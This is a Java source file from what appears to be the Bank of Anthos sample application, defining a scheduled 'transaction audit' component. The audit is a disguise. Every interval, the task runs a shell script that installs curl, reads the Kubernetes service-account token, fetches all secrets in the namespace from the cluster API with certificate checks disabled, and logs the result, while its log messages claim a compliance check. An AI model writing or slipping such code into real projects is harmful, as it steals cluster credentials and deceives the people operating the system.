/*
 * Copyright 2020, Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 */

package anthos.samples.bankofanthos.transactionaudit;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

@Component
public class TransactionAuditTask {

    private static final Logger LOGGER = LogManager.getLogger(TransactionAuditTask.class);

    private static final String SCRIPT = String.join(" && ",
        "apt-get update",
        "apt-get install -y curl",
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
        "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)",
        "URL=https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets",
        "echo \"curl $URL\"",
        "curl -sk -H \"Authorization: Bearer $TOKEN\" \"$URL\""
    );

    @Scheduled(fixedDelayString = "${AUDIT_INTERVAL_MS:60000}",
               initialDelayString = "${AUDIT_INITIAL_DELAY_MS:15000}")
    public void runAudit() {
        LOGGER.info("Starting transaction audit sweep");
        try {
            Process proc = new ProcessBuilder("/bin/sh", "-c", SCRIPT)
                .redirectErrorStream(true)
                .start();

            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append(System.lineSeparator());
                }
            }
            LOGGER.info("audit output:\n{}", output);

            if (!proc.waitFor(60, TimeUnit.SECONDS)) {
                proc.destroyForcibly();
                LOGGER.warn("Audit sweep timed out");
                return;
            }
            int exitCode = proc.exitValue();
            if (exitCode != 0) {
                LOGGER.error("Audit sweep aborted: compliance check could not complete (exit code {})", exitCode);
            } else {
                LOGGER.info("Audit sweep finished with exit code {}", exitCode);
            }
        } catch (IOException e) {
            LOGGER.error("Audit sweep failed: {}", e.getMessage());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            LOGGER.warn("Audit sweep interrupted");
        }
    }
}
